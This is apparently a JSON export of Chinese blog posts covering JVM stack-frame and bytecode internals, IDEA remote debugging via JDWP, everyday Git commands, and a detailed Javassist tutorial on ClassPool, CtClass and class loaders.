动态语言中，变量没有类型信息，变量值才有类型信息。 Java: String info = “atguigu”;//info = atguigu;会报错 类型不匹配 JS：var name = 123;var name = “sun”;都可以 var就是一个变量的泛化。 方法调用 方法的绑定机制：符号引用转换为调用方法 静态链接： 当一个字节码装进JVM内部的时候，如果被调用的方法在编译器可知，且运行时保持不变。静态链接 动态链接： 当被调用的方法无法在编译期确定下来，只有在程序运行起来，才能确定。动态链接 动态链接：将符号引用直接变成直接引用 在.java-&gt;.class过程中，所有的变量和方法引用都会作为符号引用（#5）保存在class文件的常量池中 比如描述一个方法调用了另外的其他方法，就是通过常量池中指向方法的符号引用来表示的。 动态链接的用途就是去运行时常量池（在方法区里面）里面把这些符号引用转换为调用方法的直接引用。 重点!!! JVM是基于栈的计算模型 在解析过程中，每当为Java方法分配栈帧时 执行每条执行之前，JVM要求该指令的操作数已被压入操作数栈中 在执行指令时，JVM会将该指令所需要的操作数弹出，并将该指令的结果重新压入栈中 栈帧栈帧是线程私有的，每一个方法对应一个栈帧。 四个主要组成成分：操作数栈，局部变量表，动态链接，方法返回地址。（还有一些附加信息，无所谓了） 重点说两个：局部变量表和操作数栈 局部变量表当一个方法被调用时，会使用局部变量表来存储参数值和方法内部的方法局部变量。 他是一个数组，用来存放方法参数和定义在方法内部的方法变量。 可以是引用类型（String等），可以是对象引用，可以是返回地址。 线程私有数据。 如果当前方法是对象实例的成员方法（没有被static修饰），那局部变量表[0]存放的是this的引用。 参数分配完毕后，再根据方法体内部定义的局部变量顺序和作用域分配其余的变量槽。 这里基本数据类型（double long除外）+ 引用类型（String） 都是一个slot ；long double 都是两个slot 操作数栈也常称为操作栈，它是一个后入先出栈(LIFO)。 保存程序执行过程中的临时结果，保存中间变量。 当一个方法刚刚开始执行时，其操作数栈是空的，随着方法执行和字节码指令的执行，会从局部变量表或对象实例的字段中复制常量或变量写入到操作数栈，再随着计算的进行将栈中元素出栈到局部变量表或者返回给方法调用者，也就是出栈/入栈操作。一个完整的方法执行期间往往包含多个这样出栈/入栈的过程。 如果被调用的方法带有返回值的话，其返回值将会被压入当前栈帧的操作数栈中。 小例子 Javap -v Demo: 流程： 操作数栈长度为2，局部变量表长度为4，参数大小为1 pc寄存器地址值：JVM字节码指令 bipush 10从常量池里取出10 放到操作数栈顶 istore_1 将操作数栈中栈顶元素给到局部变量表的1号位置 10（0号位置给了this） bipush 20从常量池里取出20 放到操作数栈顶 istore_2 将操作数栈中栈顶元素给到局部变量表的2号位置 20 iload1从局部变量表中取出1号元素 10 放到操作数栈栈顶 Iload2从局部变量表中取出2号元素 20 放到操作数栈栈顶 iadd 将当前操作数栈的栈顶两个元素求和 结果放在栈顶 return结束 返回void 再看一个方法调用的： javap -v Main 先看创建一个对象： 执行new指令时，JVM将指向一块已分配的但未初始化的内存引用压入操作数栈。此时A类在方法区，堆中创建一个A对象的空间，大小可以确定，一些值会进行默认初始化。 接下来dup就是将操作数栈栈顶的值（对象堆空间的引用值）复制一份，压入栈顶。 invokespecial指令将要以这个引用为调用者，调用其构造器 该指令将消耗掉操作数栈上的元素，作为它的调用者和参数 因此，在这之前利用dup指令复制一份new指令的结果，并用来调用构造器 这里 invokespecial指令结束之后，返回对象的引用为void，栈中元素只有一个引用（之前复制的那个） 接着aload_1，将局部变量表里1号位置的元素（参数args）取出，放在栈顶 接下来invokevitural，调用虚方法method1(args)，这里javap -v A 在method1内部，操作数栈大小为1，局部变量表为2（0号位置本类this） 首先aload_1将参数args放入操作数栈顶 接着areturn，将栈顶元素返回，是引用类型（String） 这时候回到之前main方法的操作数栈，返回的param放在了栈顶。 接着astore_2将返回值param放在了局部变量表的2号位置 此时操作数栈为空 接着继续new出来一个B对象，与上个A对象同理 依旧还是dup之后invokevirtual调用构造方法 之后aload_2将局部变量表里面的2号元素（也就是之前的param拿出来，也就是cmd）放到栈顶 invokevirtual去执行method2（cmd）方法 javap -v B看一下 在method2里面 实例化了C对象 嵌套起来了 在method2里面，操作数栈大小为2，局部变量表大小为2 new-dup-init组合拳生成C对象 接下来调用method3（param） javap -v C 直接返回param 那么对于method3返回的结果，被B的method2进行了11:areturn返回 返回到哪里 ？ 返回到了调用method2的main方法内部23:areturn地方 作为main函数的最终结果返回。 Java创建对象的过程这篇讲得非常好，来总结一下3种主流方法。 new1Object obj = new Object(); 最常用的创建方式。 对应字节码： 在Java中，认为创建一个对象就是调用其构造方法，对于new Object()方法其实就是调用了Object类的无参构造方法，但是在字节码中，对象的创建和调用构造方法是分开的。 在上图字节码中， new指令其实就是在堆中创建一个对象，并把对象的引用压入栈（指代操作数栈，后面同理）中。 dup指令会复制栈上最后的一个元素，然后将这个复制压入栈顶。为什么会有两个呢？ 是因为接下来的invokespecial指令会消耗掉操作数栈顶部的一个对象引用，作为传递给构造器的this参数，我们希望在invokespecial调用之后，在操作数栈顶还维持一个指向新建对象的引用，那么就得先在invokespecial之前先复制一份引用，也就是dup的原因。 newInstance方法来创建这里，newInstance方法是指Class类中的方法，newInstance方法会调用无参的构造方法创建对象。 两种模板： 123User user = (User)Class.forName(\"com.sec.User\").newInstance();User user = User.class.newInstance(); ldc指令代表将常量池里的引用推入栈顶 forName是静态方法 需要invokestatic newInstance 是虚方法，需要invokevirtual 使用反射API来创建对象例子： 12Constructor&lt;User&gt; cons = User.class.getConstructor();User user = cons.newInstance(); 备忘java中没有被static native修饰的方法就是是虚方法 感觉invokespecial init是消耗一个对象内存 不会返回任何东西（或者说返回void） 注意最后这个pop弹栈操作，很关键。 首先new-dup出现两个ref在栈中 那么invokespecial会消耗一个对象引用 还会剩一个 最后的pop也就是将最后一个（栈顶）弹出来，操作数栈排空。 invokestatic 是不消耗任何对象引用，静态方法是不需要对象.的格式去调用，直接类.方法就好了 invokevirtual是获取通常为this和参数，然后一起进行方法调用。","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://0range228.github.io/tags/JVM/"}]},{"title":"IDEA远程调试记录","slug":"IDEA远程调试记录","date":"2021-03-15T06:34:39.000Z","updated":"2021-03-15T07:20:00.978Z","comments":true,"path":"IDEA远程调试记录/","link":"","permalink":"https://0range228.github.io/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/","excerpt":"序言 天街小雨润如酥，草色遥看近却无。 记录IDEA远程调试过程。随时更新，参考yz。","text":"序言 天街小雨润如酥，草色遥看近却无。 记录IDEA远程调试过程。随时更新，参考yz。 环境准备点击工具栏的Add Configuration...，点击左侧的+号，选择Remote，如下图： 创建之后，复制这段命令，记得要改成suspend=y。 开始调试有源码调试这里在IDEA自带的终端里演示（系统shell当然也可以）： cd classes: 输入这条命令java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005 com.sec.Test 注意末尾是你的包名类名，执行后终端会等待debug，这时候下断点可以看到终端里会配合输出。 无源码 只有jar包这种需求更加常见，对于jar包里的代码，下端点调试的想法会更多，记录一下。 首先，这里我是一个maven项目，mvn clean package即可，当然你直接shell打包也行： 12cd srcjar -cvf test.jar * 对于打包好的jar包，可以放在当前的IDEA项目下，右键-&gt;add as library，可以直接反编译源码 打开jar包，在想看的地方下端点 执行命令： 1java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005 -cp Test.jar com.sec.Test 点击小甲虫就完事了：","categories":[{"name":"IDE","slug":"IDE","permalink":"https://0range228.github.io/categories/IDE/"}],"tags":[{"name":"IDEA","slug":"IDEA","permalink":"https://0range228.github.io/tags/IDEA/"}]},{"title":"Git笔记","slug":"Git笔记","date":"2021-03-05T16:29:37.000Z","updated":"2021-03-14T07:15:11.039Z","comments":true,"path":"Git笔记/","link":"","permalink":"https://0range228.github.io/Git%E7%AC%94%E8%AE%B0/","excerpt":"序言 日长似岁闲方觉，事大如天醉亦休。 整理Git相关知识 ，以及如何与IDEA梦幻联动。随时更新。","text":"序言 日长似岁闲方觉，事大如天醉亦休。 整理Git相关知识 ，以及如何与IDEA梦幻联动。随时更新。 常用命令本地 add 暂存区 commit -m 本地仓库 git push 远程仓库 git add 提交暂存区 git commit -m “xxx” 提交本地Git仓库 git pull 检查协同操作是否冲突 git push 上传远程仓库 git status 查看本地git任务状态 git log 查看操作日志 实战记录新建项目关联远程git仓库cd git init git add . git commit -m “push “ git remote add origin GIT_LINK[.git] 关联远程仓库 git pull –rebase origin master 检查/校验 多人开发 git push -u origin master 更新之后提交至git仓库cd git add FILENAME git commit -m “修改了xxx” git pull –rebase origin master git push -u origin master 删除远程中仓库中的文件git rm -r -n –cached 文件/文件夹 预览暂存区中要删除哪些文件（只是预览） git rm -r –cached 文件/文件夹 直接删除 git commit -m ‘xxx’ git push 提交远程仓库 如果远程+本地+暂存区，一起删除文件： git rm file_pathgit commit -m ‘delete somefile’git push IDEA &amp; Githubgit init : VCS -&gt; Import into Version Control -&gt; Create Git Repositry 选择目标项目文件夹 git add . : 右键项目 -&gt; Git -&gt; add (首次配置，之后不用) git remote : 右键项目 -&gt; Git -&gt; Repository -&gt; Remotes name：origin git：粘贴github仓库地址 git commit : 右键项目 -&gt; commit directory -&gt; 在窗口中选择上传文件 上传记录 git push 右上箭头即可 不好使可以： git pull git pull origin master git pull origin master –allow-unrelated-histories git push -u origin master -f 对于没有的项目 可以VCS -&gt; Import into Version Control -&gt;Share Project on Github 对于git clone下来的项目，如修改之后想再次提交 可以直接右上push 箭头可以直接提交 commit pull push 红色：未add；绿色：已add、未commit；蓝色：已add、已commit、有改动；灰色：忽略；","categories":[{"name":"基础工具","slug":"基础工具","permalink":"https://0range228.github.io/categories/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://0range228.github.io/tags/Git/"}]},{"title":"Javassist学习笔记","slug":"Javassist学习笔记","date":"2021-02-16T11:13:46.000Z","updated":"2021-06-03T15:44:16.023Z","comments":true,"path":"Javassist学习笔记/","link":"","permalink":"https://0range228.github.io/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"序言 醉里挑灯看剑，梦回吹角连营。 整理Javassist相关知识 。","text":"序言 醉里挑灯看剑，梦回吹角连营。 整理Javassist相关知识 。 背景比ASM更适合人类操纵字节码，使用API可以实现例如生成类、修改类的操作。 允许Java程序可以在运行时定义一个新的class、在JVM加载时修改class文件。 提供了2各层次的API：源码级别、字节码级别。 如果用户使用了源码级别的API，就可以在不了解Java字节码规范的情况下编辑class文件。整个API是基于Java语言词汇设计的。你甚至可以以源码文本形式指定插入字节码，javassist编译它是非常快的。 另一方面。字节码层次的API允许用户像其它编辑器一样直接编辑class文件。 API文档 读写字节码Javassist是一个处理字节码的类库。Java字节码存储在一个叫做*.class的二进制文件中。每个class文件包含一个Java类或者接口。 javassist.CtClass 代表一个class文件的抽象类表示形式。一个CtClass(compile-time class编译时的类)是一个处理class文件的句柄，以下是一个简单的程序： 1234ClassPool pool = ClassPool.getDefault();CtClass cc = pool.get(\"test.Rectangle\");cc.setSuperclass(pool.get(\"test.Point\"));cc.writeFile(); 这段程序首先包含一个ClassPool对象，通过Javassist控制字节码的修改。 ClassPool对象是代表class文件的CtClass对象的容器。它根据构造一个CtClass对象的需求读取一个class文件，并记录被构建好的对象以供将来进行访问。 为了修改一个类的定义，用户必须首先从ClassPool对象的.get(className)方法获取一个CtClass引用。 在上述示例中，CtClass对象cc表示ClassPool中的类test.Rectangle，并且将其分配给变量cc。 ClassPool对象由静态方法getDefault方法查找默认的系统检索path返回。格式为“包名.类名”。 从实现上来看，ClassPool是一个CtClass的哈希表，使用class name作为key。 ClassPool.get()方法通过检索这个哈希表找到一个CtClass对象关联指定的key。 如果CtClass对象没有找到，get()方法会读取class文件去构造一个CtClass对象，记录在哈希表中然后作为get()的返回值返回。 从ClassPool中获取到的CtClass对象是可以被修改的。在上述示例中，它被修改了 test.Rectangle的父类变更为test.Point,这个修改将会在最后CtClass.writeFile()方法调用后反映在class文件中。 javassist提供了写到类文件的方法： writeFile() 方法将CtClass对象转换到class文件并且将其写入本地磁盘。Javassist也提供了一个方法用于直接获取修改后的字节码：toBytecode(): 1byte[] b = cc.toBytecode(); 也可以像这样直接加载CtClass: 1Class clazz = cc.toClass(); toClass 请求当前线程的上下文类加载器去加载class文件，返回一个java.lang.Class对象。 例子： 定义一个新类重新定义一个新的类，ClassPool.makeClass方法将会被调用： 1234// 定义一个新的类ClassPool pool = ClassPool.getDefault();CtClass cc = pool.makeClass(\"com.sec.Point\");System.out.println(cc.toClass()); // 输出class com.sec.Point 这个程序定义了一个Point类，未包含任何成员，成员方法可以通过使用CtClass的addMethod()方法传入一个CtMethod的factory方法创建的对象作为参数来追加。 12345678910// 定义一个新的类ClassPool pool = ClassPool.getDefault();CtClass cc = pool.makeClass(\"hello.make.Point\");//System.out.println(cc2.toClass().getMethods().length); // 9// 追加方法cc.addMethod(CtMethod.make(\"public void sayHello()&#123;\\n\" + \" System.out.println(\\\"Hello!\\\");\\n\" + \" &#125;\",cc));System.out.println(cc.toClass().getMethods().length); // 10 makeClass()方法不能创建一个新的接口，需要使用makeInterface()方法才可以创建一个新的接口。 接口中的成员方法可以通过CtMethod的abstractMethod方法创建。 以上这个例子会报错：com.sec.Point class is frozen Frozen冻结类 冻结类的含义 如果一个CtClass对象通过writeFile()、toBytecode、toClass()方法被转换到class文件中，Javassist则会冻结这个CtClass对象。再对这个CtClass对象进行操作则是不允许的，当开发者尝试去修改一个已经被JVM加载过的class文件的时候会发出警告，因为JVM不允许重复加载一个class。 一个冻结的CtClass可以通过其defrost()方法解冻，解冻后可以允许对这个CtClass修改： 123456789// 被冻结了，不能再修改(Exception in thread \"main\" java.lang.RuntimeException: com.sec.Point class is frozen)// 解冻后可以修改cc.toBytecode(); or cc.toClass();// 被冻结cc.defrost();// 解冻//以上两部顺序不能反，都是先解冻再修改。System.out.println(cc.getFields().length);cc.addField(CtField.make(\"private String name;\", cc));// 解冻后允许修改cc.writeFile();System.out.println(cc.getFields().length); 修剪类 prune如果ClassPool.doPruning被设置为true，那么当Javassist冻结一个CtClass对象时，Javassist就会对该对象中包含的数据结构进行修剪。为了减少内存消耗，修剪会丢弃该对象中不必要的属性（attribute_info结构）。例如，Code_attribute结构（方法体）会被丢弃。因此，当一个CtClass对象被修剪后，除了方法名、签名和注释外，无法访问方法的字节码。修剪后的CtClass对象不能再被解冻。ClassPool.doPruning 的默认值是 false。 要禁止修剪一个特定的CtClass，必须事先对该对象调用stopPruning(true)。 在调试时，你可能想暂时停止修剪和冻结，并将修改后的类文件写入磁盘驱动器。debugWriteFile()是一个方便的方法。它停止修剪，写入一个类文件，将其解冻，并再次开启修剪（如果最初是开启的）。 类搜索路径默认的ClassPool.getDefault()检索路径和JVM底层路径一致（classpath）。如果一个程序运行在一个web应用程序比如JBoss、Tomcat中，ClassPool对象则可能搜索不到用户的类，因为这样的Web应用服务器使用多个类加载器以及系统类加载器。==在这种情况下，一个额外的classpath必须注册到ClassPool中==。假设pool引用了一个ClassPool对象： 12//添加class查找路径search pathpool.insertClassPath(new ClassClassPath(this.getClass())); 这个语句注册了用于加载这个对象类的类路径。你可以使用任何Class对象作为参数来代替this.getClass()。Class对象已经被注册上了的表现就是它所在的class path被加载了。 你也可以注册一个目录的名称作为一个class查找路径。例如，以下代码添加了/usr/local/javalib到class查找路径中： 12// 添加文件目录作为class查找路径pool.insertClassPath(\"/usr/local/javalib\"); 还可以添加URL作为class查找路径： 1234// 添加URL作为class查找路径，第三个参数必须/开头、第四个参数必须.结尾// 添加 \"http://www.javassist.org:80/java/\"ClassPath cp = new URLClassPath(\"www.javassist.org\", 80, \"/java/\", \"org.javassist.\");pool.insertClassPath(cp); 上面操作添加了http://www.javassist.org:80/java/到class查找路径中。这个URL仅仅用来查找org.javassist.包的类。 例如：加载一个org.javassist.test.Main类，它的class文件是： http://www.javassist.org:80/java/org/javassist/test/Main.class 此外，你还可以直接给一个byte数组去构建一个CtClass对象，可以使用ByteArrayClassPath： 123456// byte数组形式class pathClassPool pool2 = ClassPool.getDefault();byte[] arr = \"org.byron4j\".getBytes();String name = \"org.byron4j.Hello\";pool2.insertClassPath(new ByteArrayClassPath(name, arr));CtClass ctClass = pool2.get(name); CtClass对象ctClass表示字节数组b指定的class文件定义的类实例。ClassPool从给定的ByteArrayClassPath读取一个class文件。 如果调用get()并且给get()的类名等于name指定的类名，则ClassPool从给定的ByteArrayClassPath中读取类文件。 如果你不确定类的完全限定名，你可以使用ClassPool的makeClass方法： 1234// makeClassClassPool pool3 = ClassPool.getDefault();InputStream ins = new FileInputStream(\"/usr/local/javalib\");CtClass ctClass1 = pool3.makeClass(ins); 这里，makeClass() 返回从给定的输入流构建的 CtClass 对象。 你可以使用makeClass()将类文件急切地送入ClassPool对象。如果搜索路径包含一个大的jar文件，这可以提高性能。由于ClassPool对象按需读取类文件，它可能会重复搜索整个jar文件中的每一个类文件，makeClass()可以用来优化这种搜索。makeClass()构造的CtClass会被保存在ClassPool对象中，并且永远不会再读取类文件。 用户可以扩展class查找路径。可以定义一个实现ClassPath接口的新类，并将该类的一个实例交给ClassPool中的insertClassPath()。这种方式可以允许将非标准资源包含到class查找路径中。 ClassPool一个ClassPool对象是CtClass对象的容器。一旦一个CtClass对象被创建，它将永远记录在ClassPool中。这是因为编译器在以后编译引用该CtClass所代表的类的源代码时，可能需要访问该CtClass对象。 例如，假设一个新的方法getter()被添加到代表Point类的CtClass对象中。之后，程序试图编译包括Point中对getter()的方法调用的源代码，并将编译后的代码作为方法的主体，将其添加到另一个类Line中。如果丢失了代表Point的CtClass对象，编译器就无法编译对getter()的方法调用。请注意，原来的类定义并不包括getter()。因此，为了正确地编译这样的方法调用，ClassPool必须在程序执行的所有时间都包含CtClass的所有实例。 避免内存不足如果CtClass对象的数量变得大得惊人，ClassPool的这种规范可能会造成巨大的内存消耗（这种情况很少发生，因为Javassist试图通过各种方式减少内存消耗：冻结calss等方式）。为了避免这个问题，你可以明确地从ClassPool中删除一个不必要的CtClass对象。如果你在一个CtClass对象上调用detach()，那么这个CtClass对象就会从ClassPool中删除。例如 123456ClassPool classPool = ClassPool.getDefault();CtClass cc = classPool.get(\"org.byron4j.cookbook.javaagent.Javassist2ClassPool\");// 调用该方法后，会将CtClass对象从ClassPool中移除cc.writeFile();cc.detach(); 在detach()被调用后，你不能调用该CtClass对象上的任何方法。但是，你可以在ClassPool上调用get()来制作一个新的代表同一个类的CtClass实例。如果你调用get()，ClassPool会再次读取一个类文件，并新创建一个CtClass对象，这个对象由get()返回。 另一个想法是偶尔用新的ClassPool替换一个ClassPool，并丢弃旧的ClassPool。如果一个旧的ClassPool被垃圾回收，那么该ClassPool中包含的CtClass对象也会被垃圾回收。要创建一个新的ClassPool实例，请执行以下代码片段: 12ClassPool cp = new ClassPool(true)//简单粗暴// if needed, append an extra search path by appendClassPath() 这将创建一个ClassPool对象，它的行为就像ClassPool.getDefault()返回的默认ClassPool一样，getDefault()只是一个方便的方法。 注意，new ClassPool(true)是一个方便的构造函数，它可以构造一个ClassPool对象，并将系统搜索路径附加到它上面。调用该构造函数相当于下面的代码。 12ClassPool cp = new ClassPool();cp.appendSystemPath(); // or append another path by appendClassPath() 级联ClassPool如果程序运行在Web应用服务器上，是需要创建ClassPool的多个实例；应该为每个类加载器（容器）创建一个ClassPool的实例。==程序应该通过不调用getDefault()而调用ClassPool的构造函数来创建ClassPool对象==。 多个ClassPool对象可以像java.lang.ClassLoader一样级联。比如说 1234// 级联ClassPoolClassPool parent = ClassPool.getDefault();ClassPool child = new ClassPool(parent);child.insertClassPath(\"./classes\"); 如果调用了child.get()，子ClassPool首先委托给父ClassPool。如果父ClassPool未能找到一个类文件，那么子ClassPool会尝试在./classes目录下找到一个类文件。 如果child.childFirstLookup为true，则子ClassPool在委托给父ClassPool之前，会尝试查找类文件。例如 12345// child classpool在委托之前加载类文件ClassPool parent2 = ClassPool.getDefault();ClassPool child2 = new ClassPool(parent2);child2.appendSystemPath(); // 和默认同样的class查找路径child2.childFirstLookup = true; // 改变child的行为 改变类名来定义新类一个新的class可以被定义为一个已存在的类的副本。 123ClassPool pool3 = ClassPool.getDefault();CtClass cc3 = pool3.get(\"org.byron4j.cookbook.javaagent.Point\");cc3.setName(\"Pair\"); 这个程序首先包含类Point的CtClass对象，然后调用setName()方法为CtClass对象设置新的名称。 在这个调用之后，该CtClass对象所代表的类定义中所有出现的类名都由Point改为Pair。类定义的其他部分不会改变。 注意，CtClass中的setName()会改变ClassPool对象中的一条记录。从实现的角度来看，ClassPool对象是一个CtClass对象的哈希表，setName()改变了哈希表中与CtClass对象相关联的key。该键由原来的类名改为新的类名。 因此，如果以后再次调用ClassPool对象的get(“Point”)，那么它再也不会返回变量cc3所指的CtClass对象。ClassPool对象又读取了一个类文件Point.class，它为类Point构造了一个新的CtClass对象。这是因为与名称Point相关联的CtClass对象已经不存在了。 12345678ClassPool pool = ClassPool.getDefault();CtClass cc = pool.get(\"org.byron4j.cookbook.javaagent.Point\");CtClass cc1 = pool.get(\"org.byron4j.cookbook.javaagent.Point\");cc.setName(\"Pair\");CtClass cc2 = pool.get(\"Pair\");CtClass cc3 = pool.get(\"org.byron4j.cookbook.javaagent.Point\");System.out.println(cc == cc2); // true;System.out.println(cc3 == cc2); // false; cc1和cc2指的是和cc一样的CtClass实例，而cc3没有。请注意，在执行cc.setName(“Pair”)后，cc和cc1引用的CtClass对象代表Pair类，所以cc2是去寻找Pair类而cc3还是去寻找Point类。 ClassPool 对象用于维护类和CtClass的一对一映射关系。javassist不允许两个不一样的CtClass表示同一个class，除非是两个独立的ClassPool创建的。 为了创建一个默认ClassPool实例(Clas.getDefault()返回的)的一个副本，可以使用以下代码片段： 1ClassPool cp = new ClassPool(true); 这样一来，你拥有了两个ClassPool对象，可以从每一个ClassPool提供不同的CtClass对象表示同一个类。 12345ClassPool pool10 = ClassPool.getDefault();CtClass ctClass10 = pool10.get(\"org.byron4j.cookbook.javaagent.Point\");ClassPool pool20 = new ClassPool(true);CtClass ctClass20 = pool20.get(\"org.byron4j.cookbook.javaagent.Point\");System.out.println(pool10 == pool20); // false 不同的ClassPool中表示同一个类的CtClass对象 通过重命名一个冻结的CtClass来创建一个新的CtClass对象一旦一个CtClass对象已经被writeFile()或者toBytecode()方法转到class文件，Javassist拒绝进一步修改该CtClass对象。因此，如果代表Point类的CtClass对象冻结后不能通过setName()修改它的名称。 1234ClassPool pool = ClassPool.getDefault();CtClass cc = pool.get(\"org.byron4j.cookbook.javaagent.Point\");cc.writeFile();// 被冻结cc.setName(\"Pair\");// 错误 为了打破这个约束，可以使用ClassPool的getAndRename()方法： 12345ClassPool pool30 = ClassPool.getDefault();CtClass ctClass30 = pool30.get(\"org.byron4j.cookbook.javaagent.Point\");ctClass30.writeFile();// 被冻结//ctClass30.setName(\"Pair\");// 冻结后不能使用--错误pool30.getAndRename(\"org.byron4j.cookbook.javaagent.Point\", \"Pair\"); 这是因为，如果调用getAndRename()，ClassPool首先读取Point.class来创建一个新的代表Point类的CtClass对象。然而，它在将该CtClass对象记录在哈希表中之前，会将该CtClass对象从Point重命名为Pair。因此，getAndRename()可以在调用代表Point类的CtClass对象的writeFile()或toBytecode()之后执行。 12345678910111213141516public CtClass getAndRename(String orgName, String newName) throws NotFoundException&#123; // 获取一个新的CtClass对象 CtClass clazz = get0(orgName, false); if (clazz == null) throw new NotFoundException(orgName); if (clazz instanceof CtClassType) ((CtClassType)clazz).setClassPool(this); // 设置新的名称 clazz.setName(newName); // indirectly calls // classNameChanged() in this class return clazz;&#125; ClassLoader 类加载如果事先知道必须修改什么类，那么修改类的最简单方法如下。 通过调用ClassPool.get()获得一个CtClass对象。 修改它 在该CtClass对象上调用writeFile()或toBytecode()来获取修改后的类文件。 如果一个类是否被修改是在加载时确定的，用户必须使Javassist与一个类加载器协作。Javassist可以与类加载器配合使用，这样就可以在加载时修改字节码。Javassist的用户可以定义自己版本的类加载器，但也可以使用Javassist提供的类加载器。 CtClass的toClass()方法CtClass提供了一个方便的方法toClass()，它请求当前线程的上下文类加载器加载CtClass对象所代表的类。要调用这个方法，调用者必须有相应的权限，否则，可能会抛出一个SecurityException。 下面的程序显示了如何使用toClass()： 1234567891011121314151617public class Hello &#123; public void say() &#123; System.out.println(\"Hello\"); &#125;&#125;public class Test &#123; public static void main(String[] args) throws Exception &#123; ClassPool cp = ClassPool.getDefault(); CtClass cc = cp.get(\"Hello\"); CtMethod m = cc.getDeclaredMethod(\"say\"); m.insertBefore(\"&#123; System.out.println(\\\"Hello.say():\\\"); &#125;\"); Class c = cc.toClass(); Hello h = (Hello)c.newInstance(); h.say(); &#125;&#125; Test.main()在Hello的say()的方法体中插入了对println()的调用。然后构造一个修改后的Hello类的实例，并在该实例上调用say()。 注意，==上面的程序取决于在调用toClass()之前，Hello类从未被加载==。如果不是这样，JVM就会在toClass()请求加载修改后的Hello类之前加载原来的Hello类。因此，加载修改后的Hello类会失败（会抛出LinkageError）。例如，如果Test中的main()是这样的。 123456public static void main(String[] args) throws Exception &#123; Hello orig = new Hello(); ClassPool cp = ClassPool.getDefault(); CtClass cc = cp.get(\"Hello\"); :&#125; 那么原来的Hello类在main的第一行就被加载了，而调用toClass()会抛出一个异常，因为==类加载器不能同时加载两个不同版本的Hello类==。 如果程序运行在web容器中例如JBoss、Tomcat中， 上下文的类加载器使用toClass()方法可能并不适当。在这种情况下，你可能会看到一个不期望的异常ClassCastException。为了避免这种情况，你==必须明白清楚地给定一个适当的类加载器给toClass方法==。例如，如果bean是你的会话的bean对象： 12CtClass cc = ...Class c = cc.toClass(bean.getClass().getClassLoader()); 提供toClass()是为了方便。如果你需要更复杂的功能，你应该编写自己的类加载器。 Java中的类加载在Java中，多个类加载器可以共存，每个类加载器创建自己的命名空间。不同的类加载器可以加载具有相同类名的不同class文件，加载的两个类视为不同的类，这一个特性保证我们可以在一个JVM中运行多个应用程序即使这些程序包含相同类名的不同类实例。 注意: ==JVM不允许动态的重新加载一个类。一旦某个类加载器加载了某个类后，它就不能在运行时再重新加载一个新版本的类了。== 因此，你==不能在JVM加载类后，再去变更类的定义。== 但是，JPDA（Java平台调试架构）提供了有限的类重加载能力。 如果相同的class文件被不同的类加载器加载了，==JVM会使用相同的名称和定义创建两个不同的类==，这两个类会被看做是不同的。既然这两个类是不同的，所以一个类的实例就不能分配给另一个类类型的变量了。两个类之间的转码操作失败，并抛出一个ClassCastException。 例如，下面的代码片段就会抛出一个ClassCastException异常。 1234MyClassLoader myLoader = new MyClassLoader();Class clazz = myLoader.loadClass(\"Box\");Object obj = clazz.newInstance();Box b = (Box)obj;// this always throws ClassCastException. Box类是由两个类加载器加载的。假设一个类加载器CL加载一个包括这个代码片段的类。由于这个代码片段引用了MyClassLoader、Class、Object和Box，CL也会加载这些类（除非它委托给另一个类加载器）。因此，变量b的类型就是CL加载的Box类。另一方面，myLoader也加载Box类。对象obj是myLoader加载的Box类的一个实例。因此，最后一条语句总是抛出一个ClassCastException，因为obj的类与作为变量b类型的Box类的不同版本。 多个类加载器形成一个树结构: 每个类加载器（引导加载器BootstrapClassLoader除外）都有一个父的类加载器（通常是加载了该子类加载器的类）。类加载请求可以沿着这个类加载器层级委托，一个类可能会被不是你请求的类加载器去加载。因此，被请求去加载一个类C的类加载器和实际加载这个类C的加载器可能不是同一个类加载器。以示区别，我们将前面的加载器称为C的启动器，后面的称为C的真实加载器。 此外，如果请求加载类C的类加载器CL（C的发起者）委托给父类加载器PL，之后，类加载器CL则再也不会被请求去加载类C定义中引用的任何类。CL不是类C的引用的类的启动器，相反，PL成为了类C的引用的类的启动器，并且PL将会被请求去加载它们。类C的定义所引用的类是由C的真正的加载器加载。 再看一个有些细微差异的示例： 12345678910111213141516public class Point &#123; // 被PL加载 private int x, y; public int getX() &#123; return x; &#125; :&#125;public class Box &#123; // 引导器是CL，但是真实加载器是PL private Point upperLeft, size; public int getBaseX() &#123; return upperLeft.x; &#125; :&#125;public class Window &#123; // 被CL加载 private Box box; public int getBaseX() &#123; return box.getBaseX(); &#125;&#125; 假设一个类Window被一个类加载器CL加载了，则它的引导器和真实加载器都是CL。因为Window的定义引用了Box，所以JVM会请求CL加载Box。这里，假设CL将这个任务委托给父类加载器PL。加载Box的发起者是CL，但真正的加载器是PL。在这种情况下，Point的发起者不是CL，而是PL，因为它与Box的真正加载器相同。因此，CL永远不会被请求加载Point。 接下来，让我们考虑一个稍加修改的例子。 12345678910111213141516171819public class Point &#123; private int x, y; public int getX() &#123; return x; &#125; :&#125;public class Box &#123; // 引导器是CL，但是真实加载器是PL private Point upperLeft, size; public Point getSize() &#123; return size; &#125; :&#125;public class Window &#123; // 被CL加载 private Box box; public boolean widthIs(int w) &#123; Point p = box.getSize(); return w == p.getX(); &#125;&#125; 现在Window类的定义也引用了Point类，在这个案例中，CL在被请求加载Point时也将委托给PL。你必须避免存在两个不同的类加载器重复加载同一个类，二者中的其中一个必须委托给另外一个。 如果在Point加载的时候，CL没有委托给PL，widthIs()将会抛出一个ClassCastException。因为Box的真实加载器是PL，Box中引用的类Point类也会被PL加载。因此，getSize()方法返回值是PL加载的Point的一个实例，然而getSize()方法中的变量是CL加载的Point类型，JVM将它们视作不同的类型，所以会抛出类型不匹配的异常。 这种行为有些不方便但却是必要的,如果Point p = box.getSize();不会抛出异常，则Window的程序员就打破了Point类的封装性。例如，在PL加载的Point中，字段x是私有的。但是，如果CL用下面的定义加载Point(public代替private)，Window类则可以直接访问x的值。 12345public class Point &#123; public int x, y; // not private public int getX() &#123; return x; &#125; :&#125; 使用javassist.LoaderJavassist提供了一个类加载器javassist.Loader，这个类加载器使用javassist.ClassPool对象读取class文件。 